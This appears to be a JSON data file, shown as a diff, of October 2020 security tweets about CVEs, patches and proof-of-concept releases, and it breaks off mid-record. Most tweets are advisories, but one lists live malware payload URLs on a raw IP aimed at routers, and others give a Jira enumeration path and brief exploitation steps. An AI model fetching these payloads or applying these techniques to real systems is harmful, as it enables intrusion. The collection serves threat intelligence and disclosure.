+    "expanded_url": [
+        "https://www.youtube.com/watch?v=TjTAYarKDJQ"
+    ],
+    "tweetfavorites": 49,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 19,
+    "tweettext": "Researchers at Theori have successfully confirmed the CVE-2020-16898 vulnerability, dubbed as Bad Neighbor, by demonstrating a remote crash of Windows with BSOD. Be aware of those packets! We are working to craft an RCE exploit, though it looks tough ;)\n\nhttps://t.co/AfRYs0g4iD",
+    "tweettime": "2020-10-14, 14:50:15",
+    "tweeturl": "https://twitter.com/theori_io/status/1316390869537153025",
+    "username": "theori_io"
+}
+{
+    "expanded_url": [
+        "https://tiger-team-1337.blogspot.com/2020/10/audi-a7-2014-mmi-mishandles-format.html"
+    ],
+    "tweetfavorites": 678,
+    "tweetquotes": 23,
+    "tweetreplies": 14,
+    "tweetretweets": 254,
+    "tweettext": "There was CVE-2020-16142 for Benz and CVE-2017-9212 for BMW. Now I present you, Audi. Because why not 😂 https://t.co/JnkGeTgw9x https://t.co/aQQx6hhh1h",
+    "tweettime": "2020-10-14, 14:09:21",
+    "tweeturl": "https://twitter.com/Kevin2600/status/1316380576593571840",
+    "username": "Kevin2600"
+}
+{
+    "tweetfavorites": 195,
+    "tweetquotes": 9,
+    "tweetreplies": 6,
+    "tweetretweets": 117,
+    "tweettext": "Threat level: very préoccupé\n\nCVE-2020-16947 - Microsoft Outlook RCE Vulnerability” allows attackers to send specially crafted emails that can execute commands when opened in the Microsoft Outlook software. This attack also works when an email is viewed in the preview pane. https://t.co/P9ldLFkosM",
+    "tweettime": "2020-10-14, 08:05:06",
+    "tweeturl": "https://twitter.com/H_Miser/status/1316288911040274437",
+    "username": "H_Miser"
+}
+{
+    "expanded_url": [
+        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor/",
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898"
+    ],
+    "tweetfavorites": 68,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "CVE-2020-16898 | Windows TCP/IP Remote Code Execution Vulnerability\nVulnerability Details:\nhttps://t.co/iAX5FiFajJ\nUpdate:\nhttps://t.co/TKrrUk4iQB https://t.co/j33DMv59eV",
+    "tweettime": "2020-10-14, 03:22:26",
+    "tweeturl": "https://twitter.com/blackorbird/status/1316217774125924352",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://h0mbre.github.io/RyzenMaster_CVE/"
+    ],
+    "tweetfavorites": 675,
+    "tweetquotes": 14,
+    "tweetreplies": 15,
+    "tweetretweets": 244,
+    "tweettext": "CVE-2020-12928, Privilege Escalation in AMD Ryzen Master Overclocking Utility Driver AMDRyzenMaster.sys exploit proof-of-concept. Thanks to everyone mentioned for the help! https://t.co/rmIXieOOvC",
+    "tweettime": "2020-10-14, 00:18:23",
+    "tweeturl": "https://twitter.com/h0mbre_/status/1316171459446726656",
+    "username": "h0mbre_"
+}
+{
+    "tweetfavorites": 312,
+    "tweetquotes": 26,
+    "tweetreplies": 8,
+    "tweetretweets": 232,
+    "tweettext": "Update your Microsoft software now so your system isn't exploited: CVE-2020-16898 in particular should be patched or mitigated immediately, as vulnerable systems could be compromised remotely.",
+    "tweettime": "2020-10-13, 22:54:26",
+    "tweeturl": "https://twitter.com/US_CYBERCOM/status/1316150332498608128",
+    "username": "US_CYBERCOM"
+}
+{
+    "expanded_url": [
+        "https://www.reddit.com/r/blueteamsec/comments/jal83d/cve202016952_microsoft_sharepoint_server/"
+    ],
+    "tweetfavorites": 291,
+    "tweetquotes": 7,
+    "tweetreplies": 2,
+    "tweetretweets": 132,
+    "tweettext": "CVE-2020-16898 (Windows TCP/IP RCE) is beaten by CVE-2020-16952 (SharePoint post auth file inclusion leading to RCE). CVE-2020-16952 has an exploit out and when combined with password spraying/phishing for creds s a threat right now - https://t.co/IZbbn8aB4o",
+    "tweettime": "2020-10-13, 20:12:25",
+    "tweeturl": "https://twitter.com/ollieatnccgroup/status/1316109559526838275",
+    "username": "ollieatnccgroup"
+}
+{
+    "tweetfavorites": 1096,
+    "tweetquotes": 40,
+    "tweetreplies": 20,
+    "tweetretweets": 483,
+    "tweettext": "CVE-2020-16938 - aka bits please!\nSo...recent update changed the permissions on partitions and volume device objects, granting everybody read access.\nThis means that by opening the device directly you can read the raw data without any privs.\n7zip parses NTFS so super for POC https://t.co/JXBTmcEIxQ",
+    "tweettime": "2020-10-13, 19:53:47",
+    "tweeturl": "https://twitter.com/jonasLyk/status/1316104870987010048",
+    "username": "jonasLyk"
+}
+{
+    "tweetfavorites": 435,
+    "tweetquotes": 6,
+    "tweetreplies": 8,
+    "tweetretweets": 137,
+    "tweettext": "CVE-2020-16938 WRITEUP- aka how I installed an UEFI bootkit from edge sandbox.\nSo- the UEFI partition runs FAT32( No ACL or owner concepts)- so instead access is controlled virtually.\nThing is though- by just requesting MAX for permissions everything is bypassed and you get write https://t.co/qcCZKFU6pg",
+    "tweettime": "2020-10-13, 19:38:35",
+    "tweeturl": "https://twitter.com/jonasLyk/status/1316101042279452673",
+    "username": "jonasLyk"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 20,
+    "tweettext": "\"CVE-2020-16898 | Windows TCP/IP Remote Code Execution Vulnerability\"\n\n\"A remote code execution vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets. \"\n\nhttps://t.co/bC1M9eOu2o",
+    "tweettime": "2020-10-13, 19:20:25",
+    "tweeturl": "https://twitter.com/circl_lu/status/1316096472375603202",
+    "username": "circl_lu"
+}
+{
+    "expanded_url": [
+        "https://srcincite.io/advisories/src-2020-0022/",
+        "https://srcincite.io/pocs/cve-2020-16952.py.txt"
+    ],
+    "tweetfavorites": 381,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 209,
+    "tweettext": "Microsoft SharePoint Server DataFormWebPart CreateChildControls Server-Side Include Remote Code Execution Vulnerability\n\nCVE: CVE-2020-16952\nAdvisory: https://t.co/ArJrenuRR5\nTechnical analysis + PoC exploit: https://t.co/sKCiTY1Ver",
+    "tweettime": "2020-10-13, 18:33:20",
+    "tweeturl": "https://twitter.com/steventseeley/status/1316084624553017345",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898"
+    ],
+    "tweetfavorites": 415,
+    "tweetquotes": 25,
+    "tweetreplies": 5,
+    "tweetretweets": 217,
+    "tweettext": "CVE-2020-16898 | Windows TCP/IP Remote Code Execution Vulnerability 😱\n\nhttps://t.co/0r0s1oqTDg",
+    "tweettime": "2020-10-13, 18:25:03",
+    "tweeturl": "https://twitter.com/0xdea/status/1316082539858190341",
+    "username": "0xdea"
+}
+{
+    "tweetfavorites": 52,
+    "tweetquotes": 4,
+    "tweetreplies": 2,
+    "tweetretweets": 21,
+    "tweettext": "Highlight from Patch Tuesday is CVE-2020-16898 / Bad Neighbor\n\nA RCE vulnerability exists when the Windows TCP/IP stack improperly handles ICMPv6 Router Advertisement packets that use Option Type 25 (Recursive DNS Server Option) and a length field value that is even.",
+    "tweettime": "2020-10-13, 18:06:06",
+    "tweeturl": "https://twitter.com/blueteamblog/status/1316077767805599744",
+    "username": "blueteamblog"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/microsoft-october-2020-patch-tuesday-fixes-87-vulnerabilities/"
+    ],
+    "tweetfavorites": 141,
+    "tweetquotes": 5,
+    "tweetreplies": 2,
+    "tweetretweets": 101,
+    "tweettext": "The Microsoft October Patch Tuesday security updates are out\n\n-This month we have fixes for 87 vulnerabilities\n-21 are RCEs\n-CVE-2020-16898 is probably the worst, an RCE in the Windows TCP/IP stack with a 9.8/10 CVSS score\n\nhttps://t.co/EQUMZedSLF https://t.co/geocZqAhDE",
+    "tweettime": "2020-10-13, 17:29:35",
+    "tweeturl": "https://twitter.com/campuscodi/status/1316068580585340931",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/cve-2020-16898-bad-neighbor",
+        "https://github.com/advanced-threat-research/CVE-2020-16898"
+    ],
+    "tweetfavorites": 206,
+    "tweetquotes": 9,
+    "tweetreplies": 3,
+    "tweetretweets": 135,
+    "tweettext": "#BadNeighbor is here! This is what we nicknamed the Microsoft Windows critical and wormable RCE vuln, CVE-2020-16898. McAfee ATR has released brief analysis and a Suricata rule for those unable to patch. \n\nhttps://t.co/XaocOyIv1t\nhttps://t.co/Zo8PEKUEkz\n\n#atr #badneighbor #mcafee",
+    "tweettime": "2020-10-13, 17:09:52",
+    "tweeturl": "https://twitter.com/spovolny/status/1316063618161504256",
+    "username": "spovolny"
+}
+{
+    "tweetfavorites": 54,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 8,
+    "tweettext": "Thanks to the help from @Horgh_rce, we can now confirm that we were able to attribute another Windows LPE exploit to Volodya — CVE-2017-0056. This brings the overall number of exploits we attributed to Volodya to 12. https://t.co/WRVULMLeOo",
+    "tweettime": "2020-10-12, 14:08:16",
+    "tweeturl": "https://twitter.com/EyalItkin/status/1315655528752787457",
+    "username": "EyalItkin"
+}
+{
+    "expanded_url": [
+        "https://unit42.paloaltonetworks.com/cve-2020-14386/"
+    ],
+    "tweetfavorites": 121,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 51,
+    "tweettext": "My @Unit42_Intel blog post about CVE-2020-14386: Privilege Escalation Vulnerability in the Linux kernel\nhttps://t.co/3eFaz2KwqE",
+    "tweettime": "2020-10-10, 19:01:35",
+    "tweeturl": "https://twitter.com/0xorco/status/1315004569810866176",
+    "username": "0xorco"
+}
+{
+    "expanded_url": [
+        "https://unit42.paloaltonetworks.com/cve-2020-14386/",
+        "https://www.openwall.com/lists/oss-security/2020/09/03/3"
+    ],
+    "tweetfavorites": 203,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 98,
+    "tweettext": "CVE-2020-14386: Privilege Escalation Vulnerability in the Linux kernel.\n\nBug described as a \"simple arithmetic security issue\"\n\nWrite-up: https://t.co/3iTUKjNcuh\n\nPOC: https://t.co/9NV9qTy4q5 https://t.co/NQBy4bNwQn",
+    "tweettime": "2020-10-10, 15:59:10",
+    "tweeturl": "https://twitter.com/campuscodi/status/1314958662952157184",
+    "username": "campuscodi"
+}
+{
+    "tweetfavorites": 61,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 32,
+    "tweettext": "New #security advisory 🥳:\n\n\"Unauthenticated Remote Code Execution in OverwolfUpdater\" - CVE-2020-25214 https://t.co/GRk1hgEERn",
+    "tweettime": "2020-10-09, 15:32:21",
+    "tweeturl": "https://twitter.com/niemand_sec/status/1314589526032080898",
+    "username": "niemand_sec"
+}
+{
+    "tweetfavorites": 691,
+    "tweetquotes": 27,
+    "tweetreplies": 11,
+    "tweetretweets": 411,
+    "tweettext": "We’re seeing more activity leveraging the CVE-2020-1472 exploit (ZeroLogon). A new campaign shrewdly poses as software updates that connect to known CHIMBORAZO (TA505) C2 infrastructure. The fake updates lead to UAC bypass and use of wscript.exe to run malicious scripts.",
+    "tweettime": "2020-10-06, 21:54:08",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1313598440719355904",
+    "username": "MsftSecIntel"
+}
+{
+    "expanded_url": [
+        "https://msft.it/6012TamGq"
+    ],
+    "tweetfavorites": 393,
+    "tweetquotes": 32,
+    "tweetreplies": 6,
+    "tweetretweets": 286,
+    "tweettext": "MSTIC has observed activity by the nation-state actor MERCURY using the CVE-2020-1472 exploit (ZeroLogon) in active campaigns over the last 2 weeks. We strongly recommend patching. Microsoft 365 Defender customers can also refer to these detections: https://t.co/ieBj2dox78",
+    "tweettime": "2020-10-05, 22:35:00",
+    "tweeturl": "https://twitter.com/MsftSecIntel/status/1313246337153077250",
+    "username": "MsftSecIntel"
+}
+{
+    "tweetfavorites": 179,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 53,
+    "tweettext": "Microsoft Visual Studio Code seems to have botched the fix for CVE-2020-16881, a \"remote code execution\" vulnerability regarding \"malicious package.json files\". The patch can be trivially bypassed.  A thread 🧵",
+    "tweettime": "2020-10-02, 22:10:08",
+    "tweeturl": "https://twitter.com/justinsteven/status/1312152915344195584",
+    "username": "justinsteven"
+}
+{
+    "tweetfavorites": 251,
+    "tweetquotes": 9,
+    "tweetreplies": 7,
+    "tweetretweets": 47,
+    "tweettext": "Maybe some of you are wondering where that blog post is regarding CVE-2020-16875? Well, it turns out I managed to bypass the patch.",
+    "tweettime": "2020-10-02, 18:03:29",
+    "tweeturl": "https://twitter.com/steventseeley/status/1312090843814203392",
+    "username": "steventseeley"
+}
+{
+    "tweetfavorites": 196,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 22,
+    "tweettext": "Releasing a blog post detailing CVE-2020-16875 tomorrow morning, make sure your coffee is extra brewed.",
+    "tweettime": "2020-10-01, 19:56:19",
+    "tweeturl": "https://twitter.com/steventseeley/status/1311756852871471111",
+    "username": "steventseeley"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/google-discloses-windows-zero-day-exploited-in-the-wild/"
+    ],
+    "tweetfavorites": 205,
+    "tweetquotes": 13,
+    "tweetreplies": 6,
+    "tweetretweets": 101,
+    "tweettext": "NEW: Google discloses Windows zero-day exploited in the wild\n\n-Impacts Windows 7 up to the latest Windows 10\n-Used together with a Chrome zero-day (patched last week)\n\nWindows zero-day CVE: CVE-2020-17087\nChrome zero-day CVE: CVE-2020-15999 \n\nhttps://t.co/hddB1UvqXc https://t.co/y3R9sPU7z7",
+    "tweettime": "2020-10-30, 18:31:39",
+    "tweeturl": "https://twitter.com/campuscodi/status/1322244795155288064",
+    "username": "campuscodi"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 182,
+    "tweettext": "RT @benhawkes: In addition to last week's Chrome/freetype 0day (CVE-2020-15999), Project Zero also detected and reported the Windows kernel…",
+    "tweettime": "2020-10-30, 16:52:25",
+    "tweeturl": "https://twitter.com/AdmVonSchneider/status/1322219820423798786",
+    "username": "AdmVonSchneider"
+}
+{
+    "expanded_url": [
+        "https://bugs.chromium.org/p/project-zero/issues/detail?id=2104"
+    ],
+    "tweetfavorites": 339,
+    "tweetquotes": 26,
+    "tweetreplies": 3,
+    "tweetretweets": 164,
+    "tweettext": "In addition to last week's Chrome/freetype 0day (CVE-2020-15999), Project Zero also detected and reported the Windows kernel bug (CVE-2020-17087) that was used for a sandbox escape. The technical details of CVE-2020-17087 are now available here: https://t.co/bO451188Mk",
+    "tweettime": "2020-10-30, 16:00:47",
+    "tweeturl": "https://twitter.com/benhawkes/status/1322206828202127360",
+    "username": "benhawkes"
+}
+{
+    "expanded_url": [
+        "https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf"
+    ],
+    "tweetfavorites": 621,
+    "tweetquotes": 10,
+    "tweetreplies": 9,
+    "tweetretweets": 246,
+    "tweettext": "Analysis of CVE-2020-14882\nWeblogic RCE via HTTP CVSS 9.8/10\nHope you enjoy it ;)\nThanks an anonymous man for supporting!\nhttps://t.co/Olhn9oye0r",
+    "tweettime": "2020-10-28, 09:57:29",
+    "tweeturl": "https://twitter.com/testanull/status/1321390624042442753",
+    "username": "testanull"
+}
+{
+    "expanded_url": [
+        "https://github.com/rogue-kdc/CVE-2020-16939"
+    ],
+    "tweetfavorites": 54,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "GitHub - rogue-kdc/CVE-2020-16939: PoC code for CVE-2020-16939 Windows Group Policy DACL Overwrite Privilege Escalation - https://t.co/JCs5qb6d7L",
+    "tweettime": "2020-10-27, 18:37:09",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1321159014252597249",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://securitylab.github.com/research/CVE-2020-6449-exploit-chrome-uaf"
+    ],
+    "tweetfavorites": 123,
+    "tweetquotes": 3,
+    "tweetreplies": 7,
+    "tweetretweets": 45,
+    "tweettext": "In this post I'll go through the exploit of CVE-2020-6449, a use-after-free in blink that I found in March, and break PartitionAlloc in the process: https://t.co/MG7HRkGZpk",
+    "tweettime": "2020-10-27, 17:04:33",
+    "tweeturl": "https://twitter.com/mmolgtm/status/1321135708858470402",
+    "username": "mmolgtm"
+}
+{
+    "expanded_url": [
+        "https://bit.ly/3jzOoka"
+    ],
+    "tweetfavorites": 92,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 72,
+    "tweettext": "Using the Windows Group Policy client to escalate privileges. @rogue_kdc provides a guest blog and PoC showing how CVE-2020-16939 can be abused by attackers to obtain full permissions on the contents of a folder. https://t.co/0PyMPWkM8y",
+    "tweettime": "2020-10-27, 16:14:32",
+    "tweeturl": "https://twitter.com/thezdi/status/1321123122226040832",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-arbitrary-file-read-via-logon-message-cve-2020-8255/",
+        "https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-rce-via-uncontrolled-gzip-extraction-cve-2020-8260/"
+    ],
+    "tweetfavorites": 296,
+    "tweetquotes": 5,
+    "tweetreplies": 1,
+    "tweetretweets": 147,
+    "tweettext": "Just published advisories for Pulse Connect Secure CVE-2020-8260 and CVE-2020-8255. Auth file read and auth RCE.\n\nDocumenting some new RCE techniques for arbitrary file write on PCS with \n@johnnyspandex\n\nhttps://t.co/t5SUU8EACV\n\nhttps://t.co/KxO8mWYLhR",
+    "tweettime": "2020-10-26, 20:06:11",
+    "tweeturl": "https://twitter.com/buffaloverflow/status/1320819032128425984",
+    "username": "buffaloverflow"
+}
+{
+    "tweetfavorites": 52,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 16,
+    "tweettext": "Active DDoS malware payload detected:\nhttp://172.245.7.141/b\nhttp://172.245.7.141/c\nhttp://172.245.7.141/w\n\nTarget:\nTenda AC1200 router RCE (CVE-2019-5071)\nTenda AC1900 router RCE (CVE-2020-10987)\nWiFiDog RCE\n\nExploit attempt source IP: 172.245.7.141 (🇺🇸)\n#threatintel https://t.co/NFQxJamSzE",
+    "tweettime": "2020-10-25, 00:23:03",
+    "tweeturl": "https://twitter.com/bad_packets/status/1320158900251865089",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-17023"
+    ],
+    "tweetfavorites": 55,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "⚠️VS Codeで、悪意のある「package.json」ファイルを開くと、リモートコード実行される脆弱性が報告されています。対処方法として最新版1.50.1に更新しておきましょう‼️\n🌐CVE-2020-17023 Visual Studio JSON Remote Code Execution Vulnerability\nhttps://t.co/QPYQzDqKm7\n#VSCodejp #VSCode快適生活 https://t.co/70XRMOSxkj",
+    "tweettime": "2020-10-23, 10:33:20",
+    "tweeturl": "https://twitter.com/ayatokura/status/1319587705462747137",
+    "username": "ayatokura"
+}
+{
+    "expanded_url": [
+        "https://www.oracle.com/security-alerts/cpuoct2020.html"
+    ],
+    "tweetfavorites": 254,
+    "tweetquotes": 9,
+    "tweetreplies": 6,
+    "tweetretweets": 91,
+    "tweettext": "[Vulnerability warning] CVE-2020-14882 + CVE-2020-14883 = one Get request RCE!  Please update immediately! https://t.co/rej5WheNUY https://t.co/Jy1cAwfj0r",
+    "tweettime": "2020-10-22, 05:07:58",
+    "tweeturl": "https://twitter.com/80vul/status/1319143436159647744",
+    "username": "80vul"
+}
+{
+    "tweetfavorites": 48,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 27,
+    "tweettext": "🚨ICYMI: Chrome patched a zero-day today (CVE-2020-15999) that's being actively exploited in the wild. Update now.🚨\n\nNote Firefox uses the same vulnerable library (freetype). I can't find any info on whether Firefox is vulnerable or if they've pushed any kind of fix...",
+    "tweettime": "2020-10-21, 20:46:57",
+    "tweeturl": "https://twitter.com/KentonVarda/status/1319017350180503557",
+    "username": "KentonVarda"
+}
+{
+    "expanded_url": [
+        "https://jira.atlassian.com/browse/JRASERVER-71560"
+    ],
+    "tweetfavorites": 412,
+    "tweetquotes": 4,
+    "tweetreplies": 3,
+    "tweetretweets": 172,
+    "tweettext": "Atlassian Jira unauthenticated user enumeration (CVE-2020-14181)! Versions affected:\n\nJira &lt; 7.13.6\n8.0.0 ≤ Jira &lt; 8.5.7\n8.6.0 ≤ Jira &lt; 8.12.0\n\nDiscovered by Mikhail Klyuchnikov.\n\nAdvisory: https://t.co/Pm5Vp1JvzV\n\n/secure/ViewUserHover.jspa?username=test\nThe PoC ☝️ https://t.co/jfHgSzpFAB",
+    "tweettime": "2020-10-21, 13:59:20",
+    "tweeturl": "https://twitter.com/ptswarm/status/1318914772918767619",
+    "username": "ptswarm"
+}
+{
+    "tweetfavorites": 33,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 22,
+    "tweettext": "Die am 13.10. von Microsoft bereitgestellten #Sicherheitsupdates zur Behebung der kritischen #RCE #Schwachstelle CVE-2020-16952 in #SharePoint 2013-2019 wurden bislang auf fast keinem System in Deutschland eingespielt.\nPoC #Exploit-Code ist öffentlich verfügbar! #PATCHNOW! https://t.co/v6IeX7zLya",
+    "tweettime": "2020-10-21, 10:02:29",
+    "tweeturl": "https://twitter.com/certbund/status/1318855168042074117",
+    "username": "certbund"
+}
+{
+    "expanded_url": [
+        "https://github.com/GoSecure/WSuspicious/",
+        "https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/"
+    ],
+    "tweetfavorites": 92,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 64,
+    "tweettext": "Our CVE-2020-1013 #LPE #PoC is out: WSuspicious\nAvailable here: https://t.co/d3aZgLKi4v\nBlog post reminder: https://t.co/wztiqQ7bj8\nResearch on #WSUS is still ongoing btw 🤫",
+    "tweettime": "2020-10-20, 20:43:07",
+    "tweeturl": "https://twitter.com/GoSecure_Inc/status/1318653999600500746",
+    "username": "GoSecure_Inc"
+}
+{
+    "expanded_url": [
+        "https://www.zdnet.com/article/google-releases-chrome-security-update-to-patch-actively-exploited-zero-day/"
+    ],
+    "tweetfavorites": 153,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 102,
+    "tweettext": "BREAKING: Google releases Chrome security update to patch actively exploited zero-day\n\n-Google Chrome 86.0.4240.111 released with a fix\n-0day is CVE-2020-15999 (a heap buffer overflow in the FreeType font rendering library)\n\nhttps://t.co/K73F1MV64T https://t.co/f1mCDUytbC",
+    "tweettime": "2020-10-20, 20:29:17",
+    "tweeturl": "https://twitter.com/campuscodi/status/1318650517124427777",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2020/10/stable-channel-update-for-desktop_20.html"
+    ],
+    "tweetfavorites": 540,
+    "tweetquotes": 42,
+    "tweetreplies": 9,
+    "tweetretweets": 206,
+    "tweettext": "Project Zero discovered and reported an actively exploited 0day in freetype that was being used to target Chrome. A stable release that fixes this issue (CVE-2020-15999) is available here: https://t.co/ZRQe72Qfkh",
+    "tweettime": "2020-10-20, 19:49:10",
+    "tweeturl": "https://twitter.com/benhawkes/status/1318640422571266048",
+    "username": "benhawkes"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 363,
+    "tweettext": "RT @Adam_pi3: CVE-2020-16898 – Exploiting \"Bad Neighbor\" vulnerability. My very detailed write-up with all the caveats + PoC code\nhttps://t…",
+    "tweettime": "2020-10-20, 15:53:43",
+    "tweeturl": "https://twitter.com/binitamshah/status/1318581168313311232",
+    "username": "binitamshah"
+}
+{
+    "tweetfavorites": 41,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 12,
+    "tweettext": "CVE-2020-13957 is a pretty handy bug. Easy RCE on Solr  6/7/8x versions, pre-auth often. If the Solr version is old enough, you can even chain it with CVE-2017-3164 to exploit non-exposed instances too! \n\nNever expose your Solr API/Admin interface, even internally. It's BAD idea!",
+    "tweettime": "2020-10-20, 14:54:36",
+    "tweeturl": "https://twitter.com/hkashfi/status/1318566290647322624",
+    "username": "hkashfi"
+}
+{
+    "expanded_url": [
+        "https://medium.com/@testbnull/cve-2020-4280-ibm-qradar-java-deserialization-anlysis-and-bypass-c3fe57207057"
+    ],
+    "tweetfavorites": 46,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 15,
+    "tweettext": "A few words about the CVE-2020-4280 - IBM QRadar Java Deserialization and the patch of it\n\nhttps://t.co/oZ39hxEfr0",
+    "tweettime": "2020-10-20, 12:50:34",
+    "tweeturl": "https://twitter.com/testanull/status/1318535076926222341",
+    "username": "testanull"
+}
+{
+    "expanded_url": [
+        "https://help.rapid7.com/nexpose/en-us/release-notes/index.html?pid=6.6.49"
+    ],
+    "tweetfavorites": 183,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 78,
+    "tweettext": "Rapid7 Nexpose &lt;= 6.6.48 boolean-based #SQLi found by Mikhail Klyuchnikov.\n\n\"This vulnerability could have allowed an authenticated user with a low permission level to access resources beyond their assigned permissions.\" - Rapid7\n\nCVE-2020-7383\n\n👉https://t.co/UxdfjTvsg7 https://t.co/6SuTP77cic",
+    "tweettime": "2020-10-19, 12:02:34",
+    "tweeturl": "https://twitter.com/ptswarm/status/1318160610450984961",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "http://blog.pi3.com.pl/?p=780"
+    ],
+    "tweetfavorites": 488,
+    "tweetquotes": 9,
+    "tweetreplies": 1,
+    "tweetretweets": 249,
+    "tweettext": "Hacker publishes a detailed explanation of the exploitation of Windows TCP/IP remote code execution (CVE-2020-16898) vulnerability.\n\nhttps://t.co/P3HuTggpYY",
+    "tweettime": "2020-10-17, 06:48:33",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1317356809787592705",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "http://blog.pi3.com.pl/?p=780"
+    ],
+    "tweetfavorites": 733,
+    "tweetquotes": 9,
+    "tweetreplies": 10,
+    "tweetretweets": 363,
+    "tweettext": "CVE-2020-16898 – Exploiting \"Bad Neighbor\" vulnerability. My very detailed write-up with all the caveats + PoC code\nhttps://t.co/MhKxEvLig4",
+    "tweettime": "2020-10-16, 19:00:49",
+    "tweeturl": "https://twitter.com/Adam_pi3/status/1317178701457575936",
+    "username": "Adam_pi3"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/d4em0n/e8d209e786f63493339f2ddef4d44e3d"
+    ],
+    "tweetfavorites": 211,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 72,
+    "tweettext": "Exploit CVE-2020-8835 (another kernel bpf bug). Same approach i did exploiting CVE-2017-16995 in the previous tweet. Overwriting bpf_map ops from array_of_map to array_of_maps_map_ops to gain arbitrary write, then overwriting modprobe_path to get root\nhttps://t.co/2fn5H0NKk3 https://t.co/m1OJPxUElp",
+    "tweettime": "2020-10-16, 14:35:20",
+    "tweeturl": "https://twitter.com/n0psledbyte/status/1317111893408968704",
+    "username": "n0psledbyte"
+}
+{
+    "expanded_url": [
+        "https://blog.quarkslab.com/beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html"
+    ],
+    "tweetfavorites": 195,
+    "tweetquotes": 8,
+    "tweetreplies": 5,
+    "tweetretweets": 118,
+    "tweettext": "[BLOG] Beware the Bad Neighbor: Analysis and PoC of the Windows IPv6 Router Advertisement Vulnerability (CVE-2020-16898) https://t.co/YQqarGG6Hy by @fdfalcon",
+    "tweettime": "2020-10-16, 09:26:45",
+    "tweeturl": "https://twitter.com/quarkslab/status/1317034233236520960",
+    "username": "quarkslab"
+}
+{
+    "expanded_url": [
+        "https://github.com/0neb1n/CVE-2020-16947"
+    ],
+    "tweetfavorites": 214,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 82,
+    "tweettext": "CVE-2020-16947: PoC of CVE-2020-16947 (Microsoft Outlook RCE vulnerablility)\n\nhttps://t.co/0ck5mrbwaO https://t.co/AOvsBKdGVF",
+    "tweettime": "2020-10-16, 08:21:35",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1317017834791329792",
+    "username": "cyber_advising"
+}
+{
+    "tweetfavorites": 29,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 31,
+    "tweettext": "Am 13.10. hat Microsoft Sicherheitsupdates für kritische #RCE #Schwachstellen (CVE-2020-16951, -16952) in #SharePoint 2013-2019 veröffentlicht.\n#PoC #Exploit Code ist bereits öffentlich verfügbar.\nAktuell sind mindestens 600 SharePoint-Server in Deutschland verwundbar. #PATCHNOW! https://t.co/9tTuXR0SoY",
+    "tweettime": "2020-10-16, 05:30:02",
+    "tweeturl": "https://twitter.com/certbund/status/1316974664120492033",
+    "username": "certbund"
+}
+{
+    "expanded_url": [
